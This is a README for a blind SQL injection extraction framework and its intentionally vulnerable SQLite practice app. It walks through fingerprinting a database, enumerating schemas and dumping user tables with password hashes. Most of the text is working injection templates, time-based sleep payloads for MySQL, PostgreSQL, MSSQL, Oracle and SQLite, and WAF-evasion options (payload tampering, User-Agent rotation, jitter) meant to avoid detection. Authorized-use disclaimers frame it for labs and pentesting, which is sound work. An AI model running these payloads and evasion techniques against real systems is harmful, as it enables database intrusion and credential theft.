# Blind SQLi Extractor + Practice Lab

A boolean/time-based **blind SQL injection extraction framework** (`blind_sqli.py`)
and a **deliberately-vulnerable practice target** (`vuln_app.py`) to learn it and
validate it against — like a tiny, self-contained DVWA for one specific bug class.

> ## ⚠️ AUTHORIZED USE ONLY
> `blind_sqli.py` is offensive tooling. Use it only against systems you are
> **explicitly authorized** to test (signed scope of engagement, written
> permission, your own lab, or a CTF you're entered in). Unauthorized use is
> illegal in most jurisdictions. Stay within the agreed scope, rate limits, and
> testing window. `vuln_app.py` is intentionally insecure — run it on loopback
> only and never put real data in it.

---

## Contents

| File | What it is |
|------|------------|
| `blind_sqli.py` | The extractor. Enumerates schema and dumps tables via blind SQLi. |
| `vuln_app.py` | An intentionally-vulnerable local web app to practice against. |
| `README.md` | This guide. |

---

## Requirements

- **Python 3.8+**
- For live targets: `requests` is used if installed, otherwise the tool falls
  back to the standard-library `urllib` backend automatically. **Zero
  dependencies required** — `requests` only adds TLS-verification control and
  is a little faster.
- The practice lab (`vuln_app.py`) and the offline self-test use **stdlib only**.

```bash
# Optional, recommended for real engagements:
pip install requests
```

---

## 60-second quick start

```bash
# 1. Prove the extraction engine works — offline, no target, no network:
python3 blind_sqli.py --self-test

# 2. Start the practice lab (Terminal 1):
python3 vuln_app.py --port 8099

# 3. Dump its users table (Terminal 2):
python3 blind_sqli.py --url http://127.0.0.1:8099/search --param q \
    --template "zzz' OR ({cond})-- -" --dbms sqlite \
    --true-string "MATCH=1" --action dump --db main --table users --unicode
```

Expected output from step 3:

```
id | username | password                         | email
---+----------+----------------------------------+-----------------
1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 | admin@corp.local
2  | alice    | e10adc3949ba59abbe56e057f20f883e | alice@corp.local
3  | José     | naïve🔑                           | jose@café.local
```

---

## Part 1 — The practice lab (`vuln_app.py`)

A minimal HTTP server backed by an in-memory SQLite database. Its `/search`
endpoint runs an **unsanitized** query on purpose:

```python
sql = "SELECT name, price FROM products WHERE name = '%s'" % q   # <-- vulnerable
```

It renders `MATCH=1` when the query returns rows and `MATCH=0` when it doesn't —
a classic **boolean-blind content oracle**.

### Run it

```bash
python3 vuln_app.py --port 8099          # binds 127.0.0.1:8099 by default
```

It prints the exact extractor command to use against it. Stop it with `Ctrl-C`.

### Poke it by hand

```bash
curl 'http://127.0.0.1:8099/search?q=widget'              # -> MATCH=1 (row exists)
curl 'http://127.0.0.1:8099/search?q=zzz'                 # -> MATCH=0 (no row)
curl "http://127.0.0.1:8099/search?q=zzz' OR '1'='1"      # -> MATCH=1 (injection: always true)
curl "http://127.0.0.1:8099/search?q=zzz' OR '1'='2"      # -> MATCH=0 (injection: always false)
```

The last two prove you can flip the page's truth value with injected SQL — that
difference is the oracle the extractor exploits.

### Seeded data

- `products(name, price)` — `widget`, `gadget`
- `users(id, username, password, email)` — `admin`, `alice`, and a UTF-8 row
  (`José` / `naïve🔑` / `café`) so you can practice Unicode extraction.

> The lab is SQLite, so the **boolean** oracle is the one to practice with here.
> Time-based needs a DB that can sleep (MySQL/Postgres/etc.).

---

## Part 2 — The extractor (`blind_sqli.py`)

### How blind extraction works (30-second version)

In a *blind* SQLi the page never echoes your data — it only behaves differently
for true vs false conditions. So you recover data one yes/no question at a time:

1. **Oracle** — decide TRUE vs FALSE from the response (a marker string, the HTTP
   status, body length, or response time).
2. **Ask about lengths and characters** — e.g. "is the 3rd char's code > 64?".
   The tool uses **binary search** (or parallel **bitwise** queries) so each
   character costs ~7–8 requests instead of 100+.
3. **Repeat** across every character, of every value, of every row.

You give the tool two things about *your* target and it handles the rest:

- `--template` — your injected parameter value, with `{cond}` where a boolean
  SQL condition should go. Default: `1' AND ({cond})-- -`.
- `--dbms` — which database (or `auto` to fingerprint it).

### The injection template

`{cond}` is replaced by the boolean questions the tool generates. The rest of the
template is *your* break-out and comment, matched to the injection context you
confirmed manually:

| Context you confirmed | Example `--template` |
|----------------------|----------------------|
| String, single-quote | `1' AND ({cond})-- -` |
| Numeric              | `1 AND ({cond})` |
| String inside `LIKE` | `widget%' AND ({cond})-- -` |
| OR-based (lab)       | `zzz' OR ({cond})-- -` |
| Stacked (MSSQL time) | `1';{cond}-- -` |

> Tip: run with `--dry-run` to print the exact payloads the tool will send before
> sending anything.

---

## Part 3 — Full walkthrough against the lab

Start the lab (`python3 vuln_app.py --port 8099`) and run these in order. They
mirror a real engagement: fingerprint → recon → targeted dump.

```bash
URL='http://127.0.0.1:8099/search'
COMMON=(--url "$URL" --param q --template "zzz' OR ({cond})-- -" --true-string "MATCH=1")
```

### 1. Fingerprint the DBMS

```bash
python3 blind_sqli.py "${COMMON[@]}" --dbms auto --action fingerprint
# -> sqlite
```

### 2. Enumerate databases / schemas

```bash
python3 blind_sqli.py "${COMMON[@]}" --dbms sqlite --action dbs
# -> main
```

### 3. Enumerate tables

```bash
python3 blind_sqli.py "${COMMON[@]}" --dbms sqlite --action tables --db main
# -> products
# -> users
```

### 4. Enumerate columns

```bash
python3 blind_sqli.py "${COMMON[@]}" --dbms sqlite --action columns --db main --table users
# -> id
# -> username
# -> password
# -> email
```

### 5. Dump the table (with Unicode + concurrency)

```bash
python3 blind_sqli.py "${COMMON[@]}" --dbms sqlite \
    --action dump --db main --table users --unicode --threads 10
```

### 6. Targeted dump with a filter and JSON output

```bash
python3 blind_sqli.py "${COMMON[@]}" --dbms sqlite \
    --action dump --db main --table users \
    --columns username,password --where "id=1" \
    --output creds.json
```

---

## Part 4 — Configuring for a real target

1. **Confirm the injection manually first.** Find a parameter where a true vs
   false condition changes the response. Note the *context* (quote style,
   numeric vs string, whether you need `-- -` / `#` / `*/`).
2. **Build `--template`** to break out and comment, with `{cond}` in the
   condition slot (see the table above).
3. **Pick the oracle** (next section).
4. **Set `--dbms`** or use `--dbms auto`.
5. **Dry-run** to eyeball the payloads: add `--dry-run`.
6. **Throttle** to respect the rules of engagement: `--rps`, `--delay`, `--jitter`.

### Choosing the oracle (`--technique`)

| Technique | When | Key flags |
|-----------|------|-----------|
| `boolean` (default via `auto`) | The page content/status/size differs for true vs false | `--true-string`, `--len-threshold` |
| `time` | No visible difference, but you can make the DB sleep | `--time-delay`, `--time-template` |
| `auto` | Try boolean, fall back to time | — |

**Boolean** auto-calibrates by sending `1=1` vs `1=2` and picking the first
reliable discriminator:

- `--true-string "text"` — substring present **only** in true responses (best).
- HTTP **status code** difference (automatic).
- Body **length** difference ≥ `--len-threshold` (automatic, for unstable pages).

---

## Part 5 — Time-based recipes per DBMS

Use these when there's no content/status/length difference. The tool measures
response time and calibrates a threshold automatically (`--time-delay` seconds,
`--time-samples` baseline probes). The wrapper template uses `{c}` (your
condition) and `{d}` (the delay). Built-in defaults are used unless you pass
`--time-template`.

| DBMS | Built-in | Suggested `--template` | Wrapper (`--time-template`, or built-in default shown) |
|------|----------|------------------------|--------------------------------------------------------|
| **MySQL** | ✅ default | `1' AND ({cond})-- -` | `(({c}) AND SLEEP({d}))` |
| **PostgreSQL** | ✅ default | `1' AND ({cond})-- -` | `((CASE WHEN ({c}) THEN pg_sleep({d}) ELSE pg_sleep(0) END)::text='')` |
| **MSSQL** | ✅ default (needs stacked context) | `1';{cond}-- -` | `IF(({c}))WAITFOR DELAY '0:0:{d}'` |
| **Oracle** | ✅ default | `1' AND ({cond})-- -` | `(SELECT CASE WHEN ({c}) THEN dbms_pipe.receive_message(CHR(65),{d}) ELSE 1 END FROM dual)=1` |
| **SQLite** | ⚠️ custom | `1' AND ({cond})-- -` | heavy recursive CTE — see below |

### Examples

```bash
# MySQL, time-based, 5s delay:
python3 blind_sqli.py --url https://t/item --param id \
    --template "1 AND ({cond})" --dbms mysql \
    --technique time --time-delay 5 \
    --action dump --db shop --table users

# MSSQL, stacked-query time-based:
python3 blind_sqli.py --url https://t/item --param id \
    --template "1';{cond}-- -" --dbms mssql \
    --technique time --time-delay 5 --action banner

# PostgreSQL, custom wrapper (override the default):
python3 blind_sqli.py --url https://t/item --param id \
    --template "1' AND ({cond})-- -" --dbms postgres --technique time \
    --time-template "((CASE WHEN ({c}) THEN pg_sleep({d}) ELSE pg_sleep(0) END)::text='')"
```

### SQLite time-based (no `SLEEP`)

SQLite has no sleep function; create delay with a heavy recursive CTE and tune
the iteration count to your target (it controls how long it takes — set
`--time-delay` to roughly the delay you actually observe so the threshold
calibrates correctly):

```bash
python3 blind_sqli.py --url https://t/s --param q \
    --template "zzz' OR ({cond})-- -" --dbms sqlite --technique time \
    --time-delay 2 \
    --time-template "(CASE WHEN ({c}) THEN (SELECT 1 FROM (WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x<5000000) SELECT count(*) FROM c)) ELSE 1 END)=1"
```

---

## Part 6 — Unicode / UTF-8 extraction

By default characters are searched up to code point 127 (ASCII). For non-ASCII
data choose one:

| Flag | Best for | How it works |
|------|----------|--------------|
| `--unicode` | SQLite, PostgreSQL | Code-point search up to U+10FFFF (their `UNICODE`/`ASCII` return real code points). An ASCII fast-path keeps plain text cheap. MSSQL/Oracle are BMP-only here. |
| `--bytes` | MySQL, PostgreSQL | Extracts the raw UTF-8 **byte** sequence and reassembles in Python. Most robust for multibyte data. |
| `--max-codepoint N` | manual tuning | Override the per-character search ceiling. |

```bash
# Emoji / accents from SQLite or Postgres:
... --action dump --db main --table users --unicode

# Robust multibyte from MySQL:
... --dbms mysql --action dump --db app --table members --bytes
```

---

## Part 7 — Performance & throttling

| Flag | Effect |
|------|--------|
| `--threads N` | Concurrent workers (characters are extracted in parallel). |
| `--rps R` | **Global** request-rate cap (req/s), token-bucket — works even with many threads. The key WAF/rate-limit knob. |
| `--delay S` | Base delay before each request. |
| `--jitter S` | Random extra delay `0..S` (defeats fixed-interval detection). |
| `--no-bitwise` | Use binary search instead of bitwise per-character extraction. |
| `--bits N` | Bits per character in bitwise mode (`7`=ASCII, `8`=latin-1). |

```bash
# Fast but polite: 10 workers, never exceed 15 req/s, small jitter.
... --threads 10 --rps 15 --jitter 0.3
```

---

## Part 8 — WAF evasion

| Flag | Effect |
|------|--------|
| `--tamper a,b,c` | Mutate the payload. Available: `space2comment`, `space2plus`, `equaltolike`, `charencode`, `randomcase`. |
| `--random-agent` | Rotate the `User-Agent` per request. |
| `--proxy URL` | Route through a proxy (e.g. Burp/ZAP at `http://127.0.0.1:8080`). |

```bash
... --tamper space2comment,randomcase --random-agent --proxy http://127.0.0.1:8080
```

> Stacking aggressive tampers can break payloads — verify with `--dry-run` first.
> `randomcase` deliberately skips Postgres `$blind$` dollar-quote tags.

---

## Part 9 — Raw request mode (`-r`)

Instead of `--url`/`--param`, point at a saved HTTP request (e.g. from Burp) and
mark the injection point with `{q}` (configurable via `--marker`). The marker can
sit anywhere — URL, header, cookie, or body.

`req.txt`:
```
POST /search HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Cookie: session=abc123

q=widget{q}&page=1
```

```bash
python3 blind_sqli.py -r req.txt --template "zzz' OR ({cond})-- -" \
    --dbms mysql --true-string "MATCH=1" --action dump --db app --table users
```

---

## Part 10 — Output & resume

```bash
--output results.csv      # CSV
--output results.json     # JSON
# (no --output)           # pretty TSV table to stdout
```

**Resume** lets you stop and restart without re-querying already-extracted cells:

```bash
... --action dump --db app --table users --resume run1.ckpt
# Interrupt with Ctrl-C, then re-run the exact same command — it skips cached cells.
```

---

## Part 11 — Command reference

```bash
python3 blind_sqli.py --help        # full flag list
python3 blind_sqli.py --self-test   # offline engine verification (46 checks)
```

**Actions:** `fingerprint`, `banner`, `current-db`, `dbs`, `tables`, `columns`, `dump`.

---

## Troubleshooting

| Symptom | Likely cause / fix |
|---------|--------------------|
| "Could not calibrate a boolean oracle" | The true/false pages look identical. Supply `--true-string`, lower `--len-threshold`, or switch to `--technique time`. |
| Garbage / truncated values | Wrong `--dbms`, or non-ASCII data — add `--unicode` (SQLite/Postgres) or `--bytes` (MySQL). |
| Everything reads as TRUE or FALSE | Template doesn't break out of the query context. Re-check quoting/comment; try `--dry-run`. |
| Very slow | Raise `--threads`, raise/clear `--rps`, ensure bitwise mode (default). |
| Time-based unreliable | Increase `--time-delay`, raise `--time-samples`, confirm the wrapper fits your DBMS/context. |
| TLS errors | `--insecure` (skips verification; `requests` backend only). |

---

## Limitations (honest)

- The engine is verified end-to-end against **SQLite** (the lab) and unit-tested
  for the others. Validate MySQL/Postgres/MSSQL/Oracle specifics against your own
  staging DB before relying on them.
- `--unicode` on MSSQL/Oracle is BMP-only (their functions return UTF-16 units /
  bytes, not astral code points) — use `--bytes` for 4-byte characters.
- `--bytes` is implemented for MySQL and PostgreSQL only.
- NULL column values come back as empty strings.
- Time-based on SQLite/MSSQL needs the templates documented above.
- For large or unusual real-world targets, `sqlmap` is the battle-tested tool;
  this framework shines for learning, custom contexts, and bespoke throttling.

---

## Legal & ethics

This software is provided for **authorized security testing and education only**.
You are responsible for ensuring you have explicit permission before testing any
system. The authors assume no liability for misuse.
```
